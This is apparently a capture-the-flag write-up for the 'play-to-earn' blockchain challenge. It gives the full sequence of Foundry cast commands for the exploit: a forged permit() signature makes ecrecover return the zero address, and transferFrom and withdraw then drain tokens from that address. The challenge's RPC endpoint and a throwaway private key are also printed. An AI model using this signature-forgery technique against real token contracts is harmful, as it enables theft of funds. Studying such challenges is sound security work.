Login info provided:
```
uuid:           56535432-429e-456c-848c-ec2c12d557ef
rpc endpoint:   https://play-to-earn.chals.sekai.team/56535432-429e-456c-848c-ec2c12d557ef
private key:    0x3617bfcb8932b3853c73cd8b0ba796f9e52edd6b04b6a2e3ae0e7f7994874414
your address:   0x2689F00ea00D3237A4A40e49cA32ea7BAfB331b4
setup contract: 0x70CA517Cd07d724B9722873EBA444B2EA7D7d4f8
```

I have to send a request to `Setup.sol` with `register()`
A request to `Coin.sol` to `permit()` that will make the function `ecrecover` return `address(0)`
And a request to `Coin.sol` with `transferFrom(address(0), myaddress)`

Get the `Coin.sol` address
```sh
cast storage 0x70CA517Cd07d724B9722873EBA444B2EA7D7d4f8 0 --rpc-url "https://play-to-earn.chals.sekai.team/56535432-429e-456c-848c-ec2c12d557ef"
```
```sh
0x7088512cfde545538084a54d5234d945dfdd925a
```

Permit `(Coin.sol)`
```sh
cast send 0x7088512cfde545538084a54d5234d945dfdd925a "permit(address, address, uint256, uint256, uint8, bytes32, bytes32)" 0x0000000000000000000000000000000000000000 0x2689F00ea00D3237A4A40e49cA32ea7BAfB331b4 15000000000000000000 115792089237316195423570985008687907853269984665640564039457584007913129639935 1 0x666f6f0000000000000000000000000000000000000000000000000000000000 0x666f6f0000000000000000000000000000000000000000000000000000000000 --rpc-url "https://play-to-earn.chals.sekai.team/56535432-429e-456c-848c-ec2c12d557ef" --private-key 0x3617bfcb8932b3853c73cd8b0ba796f9e52edd6b04b6a2e3ae0e7f7994874414
```

Register `(Setup.sol)`
```sh
cast send 0x70CA517Cd07d724B9722873EBA444B2EA7D7d4f8 "register()" --rpc-url "https://play-to-earn.chals.sekai.team/56535432-429e-456c-848c-ec2c12d557ef" --private-key 0x3617bfcb8932b3853c73cd8b0ba796f9e52edd6b04b6a2e3ae0e7f7994874414
```

Transfer tokens `(Coin.sol)`
```sh
cast send 0x7088512cfde545538084a54d5234d945dfdd925a "transferFrom(address, address, uint256)" 0x0000000000000000000000000000000000000000 0x2689F00ea00D3237A4A40e49cA32ea7BAfB331b4 15000000000000000000 --rpc-url "https://play-to-earn.chals.sekai.team/56535432-429e-456c-848c-ec2c12d557ef" --private-key 0x3617bfcb8932b3853c73cd8b0ba796f9e52edd6b04b6a2e3ae0e7f7994874414
```

I also need to withdraw the tokens `(Coin.sol)`
```sh
cast send 0x7088512cfde545538084a54d5234d945dfdd925a "withdraw(uint256)" 15000000000000000000 --rpc-url "https://play-to-earn.chals.sekai.team/56535432-429e-456c-848c-ec2c12d557ef" --private-key 0x3617bfcb8932b3853c73cd8b0ba796f9e52edd6b04b6a2e3ae0e7f7994874414
```

Check `isSolved() - Setup.sol`
```sh
cast call 0x70CA517Cd07d724B9722873EBA444B2EA7D7d4f8 "isSolved()" --rpc-url "https://play-to-earn.chals.sekai.team/56535432-429e-456c-848c-ec2c12d557ef"
```
## Other useful blockchain commands

Check balances (this referes to ethereum balances)
```sh
cast balance 0x0000000000000000000000000000000000000000 --rpc-url "https://play-to-earn.chals.sekai.team/56535432-429e-456c-848c-ec2c12d557ef"
```
```sh
cast balance 0x2689F00ea00D3237A4A40e49cA32ea7BAfB331b4 --rpc-url "https://play-to-earn.chals.sekai.team/56535432-429e-456c-848c-ec2c12d557ef"
```

Check token balances `(Coin.sol)`
```sh
cast call 0x7088512cfde545538084a54d5234d945dfdd925a "balanceOf(address)" 0x0000000000000000000000000000000000000000 --rpc-url "https://play-to-earn.chals.sekai.team/56535432-429e-456c-848c-ec2c12d557ef"
```

check the allowance `(Coin.sol)`
```sh
cast call 0x7088512cfde545538084a54d5234d945dfdd925a "allowance(address, address)" 0x0000000000000000000000000000000000000000 0x2689F00ea00D3237A4A40e49cA32ea7BAfB331b4 --rpc-url "https://play-to-earn.chals.sekai.team/56535432-429e-456c-848c-ec2c12d557ef"
```

## References
https://scsfg.io/hackers/signature-attacks/
